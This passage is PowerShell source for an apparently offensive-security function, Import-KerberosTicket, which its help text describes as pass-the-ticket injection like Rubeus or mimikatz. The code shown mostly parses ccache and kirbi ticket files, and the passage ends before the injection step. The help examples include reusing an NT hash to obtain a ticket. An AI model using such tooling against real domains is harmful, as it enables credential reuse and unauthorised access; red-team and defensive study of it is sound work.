function Import-KerberosTicket {
<#
.SYNOPSIS
    Imports a Kerberos ticket into the current Windows logon session (Pass-the-Ticket).

.DESCRIPTION
    This function injects a Kerberos ticket (TGT or TGS) into the current user's  Windows logon session using the LSA API (LsaCallAuthenticationPackage with  KERB_SUBMIT_TKT_REQUEST).
    After importing, the ticket will be used automatically by Windows for  Kerberos authentication (LDAP, SMB, etc.).

    This is the PowerShell equivalent of "Rubeus ptt" or "mimikatz kerberos::ptt".

    The -Kirbi and -Ccache parameters accept either:
    - A file path to a .kirbi or .ccache file
    - A Base64-encoded string (standard or URL-safe)
    The function automatically detects the input type.

.PARAMETER TicketBytes
    The raw Kerberos ticket bytes (KRB-CRED format or raw ticket).

.PARAMETER TicketBase64
    The Kerberos ticket as Base64-encoded string.

.PARAMETER Kirbi
    Path to a .kirbi file OR Base64-encoded kirbi data.
    The function auto-detects whether the input is Base64 or a file path.

.PARAMETER Ccache
    Path to a .ccache file OR Base64-encoded ccache data.
    Used by Linux systems and tools like impacket.
    The function auto-detects whether the input is Base64 or a file path.

.PARAMETER SessionKey
    Optional session key bytes for the ticket.

.PARAMETER SessionKeyType
    Encryption type of the session key (default: 18 for AES256).

.PARAMETER LUID
    Optional Logon ID to import the ticket into. Default: current session.

.EXAMPLE
    Import-KerberosTicket -TicketBase64 "YII..."
    Imports a Base64-encoded ticket into the current session.

.EXAMPLE
    Import-KerberosTicket -Kirbi "ticket.kirbi"
    Imports a ticket from a .kirbi file.

.EXAMPLE
    Import-KerberosTicket -Kirbi "YIIKwgYJKoZIhvc..."
    Imports a ticket from a Base64-encoded string.

.EXAMPLE
    Import-KerberosTicket -Ccache "/tmp/krb5cc_1000"
    Imports a ticket from a Linux ccache file.

.EXAMPLE
    $authResult = Invoke-KerberosAuth -UserName "admin" -Domain "contoso.com" -NTHash "..."
    Import-KerberosTicket -TicketBytes $authResult.TicketBytes -SessionKey $authResult.SessionKeyBytes
    Gets a TGT and imports it into the session.

.OUTPUTS
    PSCustomObject with import result.

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [byte[]]$TicketBytes,

        [Parameter(Mandatory=$false)]
        [string]$TicketBase64,

        [Parameter(Mandatory=$false)]
        [string]$Kirbi,

        [Parameter(Mandatory=$false)]
        [string]$Ccache,

        [Parameter(Mandatory=$false)]
        [byte[]]$SessionKey,

        [Parameter(Mandatory=$false)]
        [int]$SessionKeyType = 18,

        [Parameter(Mandatory=$false)]
        [UInt64]$LUID = 0,

        [Parameter(Mandatory=$false)]
        [string]$Realm,

        [Parameter(Mandatory=$false)]
        [string]$ClientName,

        [Parameter(Mandatory=$false)]
        [string]$ServerName,

        [Parameter(Mandatory=$false)]
        [string]$ServerInstance,

        [Parameter(Mandatory=$false)]
        [datetime]$AuthTime,

        [Parameter(Mandatory=$false)]
        [datetime]$StartTime,

        [Parameter(Mandatory=$false)]
        [datetime]$EndTime,

        [Parameter(Mandatory=$false)]
        [datetime]$RenewTill,

        [Parameter(Mandatory=$false)]
        [byte[]]$TicketFlags
    )

    begin {
        Write-Log "[Import-KerberosTicket] Starting ticket import..."

        # Clear previous metadata to avoid stale data from earlier calls
        $Script:KirbiMetadata = $null
        $Script:CcacheMetadata = $null

        # =====================================================
        # ASN.1 and KRB-CRED FUNCTIONS
        # =====================================================
        # Uses centralized functions from Kerberos-ASN1.ps1:
        # - New-ASN1Sequence, New-ASN1ContextTag, New-ASN1ApplicationTag
        # - New-ASN1Integer, New-ASN1OctetString, New-ASN1GeneralString
        # - New-ASN1GeneralizedTime
        # - Build-KRBCred (for building KRB-CRED structures)

        #region Ccache Parser

        function Parse-CcacheBytes {
            <#
            .SYNOPSIS
                Parses MIT Kerberos ccache data and extracts the first TGT as KRB-CRED.

            .DESCRIPTION
                Ccache file format (MIT Kerberos):
                - Header: version (2 bytes), principal, time offset
                - Credentials: list of credential entries
                - Each credential: client, server, keyblock, times, ticket, authdata

            .NOTES
                File format reference: https://web.mit.edu/kerberos/krb5-devel/doc/formats/ccache_file_format.html
            #>
            param(
                [byte[]]$Bytes
            )

            $bytes = $Bytes
            $offset = 0

            # Helper functions for reading big-endian values
            function Read-UInt16BE {
                param([int]$pos)
                # Bounds check: need 2 bytes
                if ($pos + 2 -gt $bytes.Length) {
                    throw "ccache: Read-UInt16BE out of bounds at position $pos"
                }
                return ([uint16]$bytes[$pos] -shl 8) -bor $bytes[$pos + 1]
            }

            function Read-UInt32BE {
                param([int]$pos)
                # Bounds check: need 4 bytes
                if ($pos + 4 -gt $bytes.Length) {
                    throw "ccache: Read-UInt32BE out of bounds at position $pos"
                }
                return ([uint32]$bytes[$pos] -shl 24) -bor `
                       ([uint32]$bytes[$pos + 1] -shl 16) -bor `
                       ([uint32]$bytes[$pos + 2] -shl 8) -bor `
                       $bytes[$pos + 3]
            }

            function Read-Data {
                param([int]$pos)
                # Read length (with bounds check from Read-UInt32BE)
                $len = Read-UInt32BE -pos $pos
                # Bounds check: ensure data doesn't extend beyond buffer
                if ($pos + 4 + $len -gt $bytes.Length) {
                    throw "ccache: Read-Data length $len extends beyond data at position $pos"
                }
                $data = if ($len -gt 0) { $bytes[($pos + 4)..($pos + 3 + $len)] } else { @() }
                return @{
                    Length = $len
                    Data = $data
                    NextPos = $pos + 4 + $len
                }
            }

            function Read-Principal {
                param([int]$pos, [int]$version)
                $result = @{
                    NameType = 0
                    Components = @()
                    Realm = ""
                    NextPos = $pos
                }

                # Name type (4 bytes)
                $result.NameType = Read-UInt32BE -pos $pos
                $pos += 4

                # Component count (4 bytes)
                $compCount = Read-UInt32BE -pos $pos
                $pos += 4

                # Realm (only in version 4+, in version 3 it's after components)
                if ($version -ge 4) {
                    $realmData = Read-Data -pos $pos
                    $result.Realm = [System.Text.Encoding]::ASCII.GetString($realmData.Data)
                    $pos = $realmData.NextPos
                }

                # Components
                for ($i = 0; $i -lt $compCount; $i++) {
                    $compData = Read-Data -pos $pos
                    $result.Components += [System.Text.Encoding]::ASCII.GetString($compData.Data)
                    $pos = $compData.NextPos
                }

                # In version 3, realm comes after components
                if ($version -lt 4) {
                    $realmData = Read-Data -pos $pos
                    $result.Realm = [System.Text.Encoding]::ASCII.GetString($realmData.Data)
                    $pos = $realmData.NextPos
                }

                $result.NextPos = $pos
                return $result
            }

            # Parse header
            $version = Read-UInt16BE -pos 0
            $offset = 2
            Write-Log "[Parse-CcacheBytes] Ccache version: $version (0x$($version.ToString('X4')))"

            # Normalize version number (0x0504 = version 4, 0x0503 = version 3, etc.)
            $versionNum = $version -band 0x00FF

            # Only support ccache version 3 and 4 (modern MIT Kerberos)
            # Version 1/2 have different structure (pre-2000 MIT Kerberos) and are extremely rare
            if ($versionNum -lt 3 -or $versionNum -gt 4) {
                if ($versionNum -eq 1 -or $versionNum -eq 2) {
                    throw "Ccache version $versionNum is not supported (legacy MIT Kerberos format from pre-2000). Please use a modern tool like 'kcc' or 'ticketConverter.py' to convert to version 4 format."
                }
                throw "Unsupported ccache version: $versionNum (0x$($version.ToString('X4'))). Only version 3 and 4 are supported."
            }

            Write-Log "[Parse-CcacheBytes] Ccache format version: $versionNum"

            # Skip header tags (version 4 only)
            if ($versionNum -eq 4) {
                $headerLen = Read-UInt16BE -pos $offset
                $offset += 2 + $headerLen
                Write-Log "[Parse-CcacheBytes] Skipped $headerLen bytes of v4 header tags"
            }

            # Read default principal
            $defaultPrinc = Read-Principal -pos $offset -version $versionNum
            $offset = $defaultPrinc.NextPos
            Write-Log "[Parse-CcacheBytes] Default principal: $($defaultPrinc.Components -join '/') @ $($defaultPrinc.Realm)"

            # Parse credentials until end of file
            $credentials = @()
            while ($offset -lt $bytes.Length) {
                try {
                    $cred = @{}

                    # Client principal
                    $client = Read-Principal -pos $offset -version $versionNum
                    $cred.ClientRealm = $client.Realm
                    $cred.ClientName = $client.Components -join '/'
                    $offset = $client.NextPos

                    # Server principal
                    $server = Read-Principal -pos $offset -version $versionNum
                    $cred.ServerRealm = $server.Realm
                    $cred.ServerName = $server.Components -join '/'
                    $offset = $server.NextPos

                    # Keyblock
                    $keyType = Read-UInt16BE -pos $offset
                    $offset += 2
                    if ($versionNum -eq 3) {
                        $offset += 2  # padding in v3
                    }
                    $keyData = Read-Data -pos $offset
                    $cred.KeyType = $keyType
                    $cred.SessionKey = $keyData.Data
                    $offset = $keyData.NextPos

                    # Times (4x uint32)
                    $cred.AuthTime = Read-UInt32BE -pos $offset
                    $offset += 4
                    $cred.StartTime = Read-UInt32BE -pos $offset
                    $offset += 4
                    $cred.EndTime = Read-UInt32BE -pos $offset
                    $offset += 4
                    $cred.RenewTill = Read-UInt32BE -pos $offset
                    $offset += 4

                    # is_skey (1 byte)
                    $offset += 1

                    # Ticket flags (4 bytes)
                    $cred.TicketFlags = Read-UInt32BE -pos $offset
                    $offset += 4

                    # Addresses (count + data)
                    $addrCount = Read-UInt32BE -pos $offset
                    $offset += 4
                    for ($i = 0; $i -lt $addrCount; $i++) {
                        $null = Read-UInt16BE -pos $offset  # addrType - skip
                        $offset += 2
                        $addrData = Read-Data -pos $offset
                        $offset = $addrData.NextPos
                    }

                    # Authdata (count + data)
                    $authCount = Read-UInt32BE -pos $offset
                    $offset += 4
                    for ($i = 0; $i -lt $authCount; $i++) {
                        $null = Read-UInt16BE -pos $offset  # authType - skip
                        $offset += 2
                        $authData = Read-Data -pos $offset
                        $offset = $authData.NextPos
                    }

                    # Ticket
                    $ticketData = Read-Data -pos $offset
                    $cred.Ticket = $ticketData.Data
                    $offset = $ticketData.NextPos

                    # Second ticket (for TGS requests)
                    $secondTicketData = Read-Data -pos $offset
                    $offset = $secondTicketData.NextPos

                    Write-Log "[Parse-CcacheBytes] Found credential: $($cred.ServerName) @ $($cred.ServerRealm)"
                    $credentials += $cred
                }
                catch {
                    Write-Log "[Parse-CcacheBytes] Error parsing credential at offset $offset : $_"
                    break
                }
            }

            if ($credentials.Count -eq 0) {
                throw "No credentials found in ccache file"
            }

            # Find TGT (krbtgt/REALM@REALM)
            $tgt = $credentials | Where-Object { $_.ServerName -match '^krbtgt/' } | Select-Object -First 1

            if (-not $tgt) {
                # Fall back to first credential
                Write-Log "[Parse-CcacheBytes] No TGT found, using first credential"
                $tgt = $credentials[0]
            }

            Write-Log "[Parse-CcacheBytes] Selected credential: $($tgt.ServerName) @ $($tgt.ServerRealm)"
            Write-Log "[Parse-CcacheBytes] Session key type: $($tgt.KeyType), length: $($tgt.SessionKey.Length)"
            Write-Log "[Parse-CcacheBytes] Ticket size: $($tgt.Ticket.Length) bytes"

            # Convert Unix timestamps to DateTime (ccache stores times as Unix epoch)
            $unixEpoch = [DateTime]::new(1970, 1, 1, 0, 0, 0, [DateTimeKind]::Utc)
            $AuthTime = if ($tgt.AuthTime -gt 0) { $unixEpoch.AddSeconds($tgt.AuthTime) } else { $null }
            $StartTime = if ($tgt.StartTime -gt 0) { $unixEpoch.AddSeconds($tgt.StartTime) } else { $null }
            $EndTime = if ($tgt.EndTime -gt 0) { $unixEpoch.AddSeconds($tgt.EndTime) } else { $null }
            $RenewTill = if ($tgt.RenewTill -gt 0) { $unixEpoch.AddSeconds($tgt.RenewTill) } else { $null }

            Write-Log "[Parse-CcacheBytes] Ticket times: Auth=$AuthTime, Start=$StartTime, End=$EndTime, Renew=$RenewTill"

            return @{
                Ticket = $tgt.Ticket
                SessionKey = $tgt.SessionKey
                SessionKeyType = $tgt.KeyType
                ClientName = $tgt.ClientName
                ClientRealm = $tgt.ClientRealm
                ServerName = $tgt.ServerName
                ServerRealm = $tgt.ServerRealm
                AuthTime = $AuthTime
                StartTime = $StartTime
                EndTime = $EndTime
                RenewTill = $RenewTill
            }
        }

        #endregion

        #region KRB-CRED Parser (for kirbi files)

        function Parse-KrbCredFile {
            <#
            .SYNOPSIS
                Parses a KRB-CRED (kirbi) file and extracts user/realm information.

            .DESCRIPTION
                KRB-CRED structure (RFC 4120):
                KRB-CRED ::= [APPLICATION 22] SEQUENCE {
                    pvno [0] INTEGER,
                    msg-type [1] INTEGER (22),
                    tickets [2] SEQUENCE OF Ticket,
                    enc-part [3] EncryptedData (contains EncKrbCredPart)
                }

                Ticket ::= [APPLICATION 1] SEQUENCE {
                    tkt-vno [0] INTEGER,
                    realm [1] Realm (GeneralString),
                    sname [2] PrincipalName,
                    enc-part [3] EncryptedData
                }

                For encrypted enc-part (etype != 0), we extract realm from Ticket structure.
                For unencrypted enc-part (etype 0), we can also parse EncKrbCredPart.
            #>
            param(
                [byte[]]$Data
            )

            $result = @{
                ClientName = $null
                ClientRealm = $null
                ServerName = $null
                ServerRealm = $null
                EncryptionType = $null
                AuthTime = $null
                StartTime = $null
                EndTime = $null
                RenewTill = $null
            }

            try {
                # Helper to read ASN.1 length
                function Read-ASN1Length {
                    param([byte[]]$bytes, [int]$offset)
                    if ($offset -ge $bytes.Length) { return @{ Length = 0; BytesConsumed = 0 } }
                    $len = $bytes[$offset]
                    if ($len -lt 128) {
                        return @{ Length = $len; BytesConsumed = 1 }
                    }
                    $numBytes = $len -band 0x7F
                    $len = 0
                    for ($i = 0; $i -lt $numBytes; $i++) {
                        if (($offset + 1 + $i) -ge $bytes.Length) { break }
                        $len = ($len -shl 8) -bor $bytes[$offset + 1 + $i]
                    }
                    return @{ Length = $len; BytesConsumed = 1 + $numBytes }
                }

                # Helper to read GeneralString
                function Read-GeneralString {
                    param([byte[]]$bytes, [int]$offset, [int]$length)
                    if (($offset + $length) -gt $bytes.Length) { return "" }
                    return [System.Text.Encoding]::ASCII.GetString($bytes, $offset, $length)
                }

                # Helper to read INTEGER value
                function Read-ASN1Integer {
                    param([byte[]]$bytes, [int]$offset)
                    if ($offset -ge $bytes.Length -or $bytes[$offset] -ne 0x02) { return @{ Value = 0; NextPos = $offset } }
                    $offset++
                    $lenInfo = Read-ASN1Length -bytes $bytes -offset $offset
                    $offset += $lenInfo.BytesConsumed
                    $value = 0
                    for ($i = 0; $i -lt $lenInfo.Length; $i++) {
                        if (($offset + $i) -ge $bytes.Length) { break }
                        $value = ($value -shl 8) -bor $bytes[$offset + $i]
                    }
                    return @{ Value = $value; NextPos = $offset + $lenInfo.Length }
                }

                # Helper to read GeneralizedTime (Kerberos time format: YYYYMMDDHHmmssZ)
                function Read-KerberosTime {
                    param([byte[]]$bytes, [int]$offset)
                    # GeneralizedTime tag is 0x18
                    if ($offset -ge $bytes.Length -or $bytes[$offset] -ne 0x18) { return $null }
                    $offset++
                    $lenInfo = Read-ASN1Length -bytes $bytes -offset $offset
                    $offset += $lenInfo.BytesConsumed
                    if ($lenInfo.Length -lt 15) { return $null }
                    $timeStr = [System.Text.Encoding]::ASCII.GetString($bytes, $offset, $lenInfo.Length)
                    # Format: YYYYMMDDHHmmssZ
                    try {
                        return [DateTime]::ParseExact($timeStr, "yyyyMMddHHmmssZ", [System.Globalization.CultureInfo]::InvariantCulture, [System.Globalization.DateTimeStyles]::AssumeUniversal)
                    } catch {
                        return $null
                    }
                }

                $pos = 0

                # APPLICATION 22 tag (0x76)
                if ($Data[$pos] -ne 0x76) {
                    Write-Log "[Parse-KrbCredFile] Not a KRB-CRED (tag: 0x$($Data[$pos].ToString('X2')))"
                    return $result
                }
                $pos++
                $lenInfo = Read-ASN1Length -bytes $Data -offset $pos
                $pos += $lenInfo.BytesConsumed

                # SEQUENCE tag (0x30)
                if ($Data[$pos] -ne 0x30) { return $result }
                $pos++
                $lenInfo = Read-ASN1Length -bytes $Data -offset $pos
                $pos += $lenInfo.BytesConsumed

                # We only need the end position for loop boundary
                $krbCredSeqEnd = $pos + $lenInfo.Length

                # Parse top-level sequence elements
                while ($pos -lt $krbCredSeqEnd -and $pos -lt $Data.Length) {
                    if ($pos -ge $Data.Length) { break }
                    $tag = $Data[$pos]

                    # Only process context tags [0] through [3]
                    if ($tag -lt 0xA0 -or $tag -gt 0xA3) {
                        $pos++
                        continue
                    }

                    $pos++
                    if ($pos -ge $Data.Length) { break }

                    $lenInfo = Read-ASN1Length -bytes $Data -offset $pos
                    $pos += $lenInfo.BytesConsumed
                    $elemLen = $lenInfo.Length
                    $elemStart = $pos

                    # Context tag [2] = tickets (SEQUENCE OF Ticket)
                    if ($tag -eq 0xA2) {
                        Write-Log "[Parse-KrbCredFile] Found tickets[2] at offset $elemStart"

                        # tickets is SEQUENCE OF Ticket
                        if ($Data[$elemStart] -eq 0x30) {
                            $ticketsSeqPos = $elemStart + 1
                            $lenInfo = Read-ASN1Length -bytes $Data -offset $ticketsSeqPos
                            $ticketsSeqPos += $lenInfo.BytesConsumed

                            # First Ticket: APPLICATION 1 (0x61)
                            if ($Data[$ticketsSeqPos] -eq 0x61) {
                                $ticketPos = $ticketsSeqPos + 1
                                $lenInfo = Read-ASN1Length -bytes $Data -offset $ticketPos
                                $ticketPos += $lenInfo.BytesConsumed

                                # Ticket is a SEQUENCE
                                if ($Data[$ticketPos] -eq 0x30) {
                                    $ticketPos++
                                    $lenInfo = Read-ASN1Length -bytes $Data -offset $ticketPos
                                    $ticketPos += $lenInfo.BytesConsumed
                                    $ticketSeqEnd = $ticketPos + $lenInfo.Length

                                    # Parse Ticket elements
                                    while ($ticketPos -lt $ticketSeqEnd -and $ticketPos -lt $Data.Length) {
                                        $ticketTag = $Data[$ticketPos]
                                        $ticketPos++

                                        if ($ticketPos -ge $Data.Length) { break }

                                        $lenInfo = Read-ASN1Length -bytes $Data -offset $ticketPos
                                        $ticketPos += $lenInfo.BytesConsumed
                                        $ticketElemLen = $lenInfo.Length
                                        $ticketElemStart = $ticketPos

                                        # Context [1] = realm (Realm = GeneralString)
                                        if ($ticketTag -eq 0xA1) {
                                            # Should be GeneralString (0x1B)
                                            if ($Data[$ticketElemStart] -eq 0x1B) {
                                                $realmPos = $ticketElemStart + 1
                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $realmPos
                                                $realmPos += $lenInfo.BytesConsumed
                                                $result.ServerRealm = Read-GeneralString -bytes $Data -offset $realmPos -length $lenInfo.Length
                                                # For TGT, server realm = client realm
                                                $result.ClientRealm = $result.ServerRealm
                                                Write-Log "[Parse-KrbCredFile] Found realm from Ticket: $($result.ServerRealm)"
                                            }
                                        }

                                        # Context [2] = sname (PrincipalName)
                                        if ($ticketTag -eq 0xA2) {
                                            # PrincipalName is a SEQUENCE
                                            if ($Data[$ticketElemStart] -eq 0x30) {
                                                $snamePos = $ticketElemStart + 1
                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $snamePos
                                                $snamePos += $lenInfo.BytesConsumed
                                                $snameEnd = $snamePos + $lenInfo.Length

                                                # Look for name-string [1] SEQUENCE OF GeneralString
                                                while ($snamePos -lt $snameEnd -and $snamePos -lt $Data.Length) {
                                                    if ($Data[$snamePos] -eq 0xA1) {
                                                        $snamePos++
                                                        $lenInfo = Read-ASN1Length -bytes $Data -offset $snamePos
                                                        $snamePos += $lenInfo.BytesConsumed

                                                        # SEQUENCE OF GeneralString
                                                        if ($Data[$snamePos] -eq 0x30) {
                                                            $snamePos++
                                                            $lenInfo = Read-ASN1Length -bytes $Data -offset $snamePos
                                                            $snamePos += $lenInfo.BytesConsumed

                                                            $nameComponents = @()
                                                            $nameSeqEnd = $snamePos + $lenInfo.Length

                                                            while ($snamePos -lt $nameSeqEnd -and $snamePos -lt $Data.Length) {
                                                                if ($Data[$snamePos] -eq 0x1B) {
                                                                    $snamePos++
                                                                    $lenInfo = Read-ASN1Length -bytes $Data -offset $snamePos
                                                                    $snamePos += $lenInfo.BytesConsumed
                                                                    $nameComponents += Read-GeneralString -bytes $Data -offset $snamePos -length $lenInfo.Length
                                                                    $snamePos += $lenInfo.Length
                                                                } else {
                                                                    $snamePos++
                                                                }
                                                            }

                                                            $result.ServerName = $nameComponents -join '/'
                                                            Write-Log "[Parse-KrbCredFile] Found sname: $($result.ServerName)"

                                                            # For TGT (krbtgt/REALM), extract client name from second component
                                                            # This is the realm, but client name comes from enc-part (not available if encrypted)
                                                        }
                                                        break
                                                    }
                                                    $snamePos++
                                                }
                                            }
                                        }

                                        # Context [3] = enc-part in Ticket (EncryptedData) - get etype
                                        if ($ticketTag -eq 0xA3) {
                                            # EncryptedData is a SEQUENCE
                                            if ($Data[$ticketElemStart] -eq 0x30) {
                                                $encPos = $ticketElemStart + 1
                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $encPos
                                                $encPos += $lenInfo.BytesConsumed

                                                # Look for etype [0] INTEGER
                                                if ($Data[$encPos] -eq 0xA0) {
                                                    $encPos++
                                                    $lenInfo = Read-ASN1Length -bytes $Data -offset $encPos
                                                    $encPos += $lenInfo.BytesConsumed
                                                    $intResult = Read-ASN1Integer -bytes $Data -offset $encPos
                                                    # This is the Ticket's enc-part etype (usually AES256=18)
                                                    $result.EncryptionType = $intResult.Value
                                                    Write-Log "[Parse-KrbCredFile] Found ticket etype: $($result.EncryptionType)"
                                                }
                                            }
                                        }

                                        $ticketPos = $ticketElemStart + $ticketElemLen
                                    }
                                }
                            }
                        }
                    }

                    # Context tag [3] = enc-part of KRB-CRED (EncryptedData containing EncKrbCredPart)
                    if ($tag -eq 0xA3) {
                        Write-Log "[Parse-KrbCredFile] Found enc-part[3] at offset $elemStart"

                        # EncryptedData is a SEQUENCE
                        if ($Data[$elemStart] -eq 0x30) {
                            $encDataPos = $elemStart + 1
                            $lenInfo = Read-ASN1Length -bytes $Data -offset $encDataPos
                            $encDataPos += $lenInfo.BytesConsumed

                            $encPartEtype = 0

                            # Look for etype [0] INTEGER
                            if ($Data[$encDataPos] -eq 0xA0) {
                                $encDataPos++
                                $lenInfo = Read-ASN1Length -bytes $Data -offset $encDataPos
                                $encDataPos += $lenInfo.BytesConsumed
                                $intResult = Read-ASN1Integer -bytes $Data -offset $encDataPos
                                $encPartEtype = $intResult.Value
                                Write-Log "[Parse-KrbCredFile] KRB-CRED enc-part etype: $encPartEtype"
                            }

                            # If etype is 0 (unencrypted), we can parse EncKrbCredPart for client info
                            if ($encPartEtype -eq 0) {
                                Write-Log "[Parse-KrbCredFile] enc-part is unencrypted - parsing EncKrbCredPart"

                                # Find APPLICATION 29 (EncKrbCredPart) in cipher [2]
                                $cipherStart = $elemStart
                                $cipherEnd = $elemStart + $elemLen

                                for ($searchPos = $cipherStart; $searchPos -lt $cipherEnd - 20; $searchPos++) {
                                    if ($Data[$searchPos] -eq 0x7D) {  # APPLICATION 29
                                        Write-Log "[Parse-KrbCredFile] Found EncKrbCredPart at offset $searchPos"

                                        $credPartPos = $searchPos + 1
                                        $lenInfo = Read-ASN1Length -bytes $Data -offset $credPartPos
                                        $credPartPos += $lenInfo.BytesConsumed
                                        $credPartEnd = $credPartPos + $lenInfo.Length

                                        # EncKrbCredPart contains ticket-info[0] SEQUENCE OF KrbCredInfo
                                        # KrbCredInfo contains: key[0], prealm[1], pname[2], ...

                                        # Search for prealm [1] (context tag A1 followed by GeneralString 1B)
                                        for ($i = $credPartPos; $i -lt $credPartEnd - 10; $i++) {
                                            # Look for pattern: A1 (length) 1B (length) (realm string)
                                            if ($Data[$i] -eq 0xA1) {
                                                $tempPos = $i + 1
                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                $tempPos += $lenInfo.BytesConsumed

                                                if ($Data[$tempPos] -eq 0x1B) {
                                                    $tempPos++
                                                    $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                    $tempPos += $lenInfo.BytesConsumed

                                                    if ($lenInfo.Length -gt 0 -and $lenInfo.Length -lt 100) {
                                                        $realm = Read-GeneralString -bytes $Data -offset $tempPos -length $lenInfo.Length
                                                        if ($realm -match '^[A-Za-z0-9\.\-]+$') {
                                                            $result.ClientRealm = $realm
                                                            Write-Log "[Parse-KrbCredFile] Found prealm in EncKrbCredPart: $realm"
                                                            break
                                                        }
                                                    }
                                                }
                                            }
                                        }

                                        # Search for pname [2] (context tag A2 followed by SEQUENCE)
                                        for ($i = $credPartPos; $i -lt $credPartEnd - 15; $i++) {
                                            if ($Data[$i] -eq 0xA2) {
                                                $tempPos = $i + 1
                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                $tempPos += $lenInfo.BytesConsumed

                                                # PrincipalName is SEQUENCE
                                                if ($Data[$tempPos] -eq 0x30) {
                                                    $tempPos++
                                                    $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                    $tempPos += $lenInfo.BytesConsumed
                                                    $pnameEnd = $tempPos + $lenInfo.Length

                                                    # Find name-string [1]
                                                    while ($tempPos -lt $pnameEnd) {
                                                        if ($Data[$tempPos] -eq 0xA1) {
                                                            $tempPos++
                                                            $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                            $tempPos += $lenInfo.BytesConsumed

                                                            # SEQUENCE OF GeneralString
                                                            if ($Data[$tempPos] -eq 0x30) {
                                                                $tempPos++
                                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                                $tempPos += $lenInfo.BytesConsumed

                                                                # First GeneralString is the username
                                                                if ($Data[$tempPos] -eq 0x1B) {
                                                                    $tempPos++
                                                                    $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                                    $tempPos += $lenInfo.BytesConsumed
                                                                    $result.ClientName = Read-GeneralString -bytes $Data -offset $tempPos -length $lenInfo.Length
                                                                    Write-Log "[Parse-KrbCredFile] Found pname in EncKrbCredPart: $($result.ClientName)"
                                                                }
                                                            }
                                                            break
                                                        }
                                                        $tempPos++
                                                    }
                                                    break
                                                }
                                            }
                                        }

                                        # Search for times in KrbCredInfo: authtime[4], starttime[5], endtime[6], renew-till[7]
                                        # Context tags A4, A5, A6, A7 followed by GeneralizedTime (0x18)
                                        for ($i = $credPartPos; $i -lt $credPartEnd - 20; $i++) {
                                            $ctxTag = $Data[$i]
                                            # Look for context tags [4] through [7]
                                            if ($ctxTag -ge 0xA4 -and $ctxTag -le 0xA7) {
                                                $tempPos = $i + 1
                                                if ($tempPos -ge $Data.Length) { continue }
                                                $lenInfo = Read-ASN1Length -bytes $Data -offset $tempPos
                                                $tempPos += $lenInfo.BytesConsumed
                                                if ($tempPos -ge $Data.Length) { continue }

                                                # Should be GeneralizedTime (0x18)
                                                $timeVal = Read-KerberosTime -bytes $Data -offset $tempPos
                                                if ($null -ne $timeVal) {
                                                    switch ($ctxTag) {
                                                        0xA4 { $result.AuthTime = $timeVal; Write-Log "[Parse-KrbCredFile] Found authtime: $timeVal" }
                                                        0xA5 { $result.StartTime = $timeVal; Write-Log "[Parse-KrbCredFile] Found starttime: $timeVal" }
                                                        0xA6 { $result.EndTime = $timeVal; Write-Log "[Parse-KrbCredFile] Found endtime: $timeVal" }
                                                        0xA7 { $result.RenewTill = $timeVal; Write-Log "[Parse-KrbCredFile] Found renew-till: $timeVal" }
                                                    }
                                                }
                                            }
                                        }

                                        break
                                    }
                                }
                            }
                        }
                    }

                    $pos = $elemStart + $elemLen
                }

                # If we couldn't get client name but have server name krbtgt/REALM, extract username from filename or leave null
                # The client name is only available in encrypted enc-part for Rubeus-generated tickets
                if (-not $result.ClientName -and $result.ServerName -match '^krbtgt/') {
                    Write-Log "[Parse-KrbCredFile] enc-part is encrypted - client name not available without decryption"
                    # For modern kirbi files, client name is in encrypted EncKrbCredPart
                    # We can only get realm from the Ticket structure
                }
            }
            catch {
                Write-Log "[Parse-KrbCredFile] Error parsing KRB-CRED: $_"
            }

            return $result
        }

        #endregion

        #region Load ticket data

        if ($Ccache) {
            # Use ConvertFrom-Base64OrFile to handle both Base64 and file path
            $ccacheResult = ConvertFrom-Base64OrFile -InputValue $Ccache -ExpectedFormat "Ccache" -ParameterName "Ccache"

            if (-not $ccacheResult.Success) {
                throw "Ccache input error: $($ccacheResult.Error)"
            }

            $ccacheBytes = $ccacheResult.Data
            Write-Log "[Import-KerberosTicket] Loaded ccache from $($ccacheResult.Source): $($ccacheBytes.Length) bytes ($($ccacheResult.Format))"

            # Parse the ccache data (need to use bytes, not file path)
            # We need to modify Parse-CcacheFile to accept bytes or use a temp approach
            $ccacheData = Parse-CcacheBytes -Bytes $ccacheBytes

            # Ccache contains raw ticket data - need to wrap in KRB-CRED
            $TicketBytes = $ccacheData.Ticket
            $SessionKey = $ccacheData.SessionKey
            $SessionKeyType = $ccacheData.SessionKeyType

            # Extract realm and names for KRB-CRED building
            if (-not $Realm) { $Realm = $ccacheData.ClientRealm }
            if (-not $ClientName) { $ClientName = $ccacheData.ClientName }
            if (-not $ServerName -and $ccacheData.ServerName -match '^([^/]+)/') {
                $ServerName = $Matches[1]
            }
            if (-not $ServerInstance -and $ccacheData.ServerName -match '/(.+)$') {
                $ServerInstance = $Matches[1]
            }

            # Store metadata for return value (including ticket times)
            $Script:CcacheMetadata = @{
                UserName = $ccacheData.ClientName
                Realm = $ccacheData.ClientRealm
                EncryptionType = $ccacheData.SessionKeyType
                AuthTime = $ccacheData.AuthTime
                StartTime = $ccacheData.StartTime
                EndTime = $ccacheData.EndTime
                RenewTill = $ccacheData.RenewTill
            }

            Write-Log "[Import-KerberosTicket] Loaded ccache: $($ccacheData.ClientName) @ $($ccacheData.ClientRealm)"
        }
        elseif ($Kirbi) {
            # Use ConvertFrom-Base64OrFile to handle both Base64 and file path
            $kirbiResult = ConvertFrom-Base64OrFile -InputValue $Kirbi -ExpectedFormat "Kirbi" -ParameterName "Kirbi"

            if (-not $kirbiResult.Success) {
                throw "Kirbi input error: $($kirbiResult.Error)"
            }

            $TicketBytes = $kirbiResult.Data
            Write-Log "[Import-KerberosTicket] Loaded kirbi from $($kirbiResult.Source): $($TicketBytes.Length) bytes ($($kirbiResult.Format))"

            # Parse kirbi to extract user/realm information and times
            $kirbiData = Parse-KrbCredFile -Data $TicketBytes
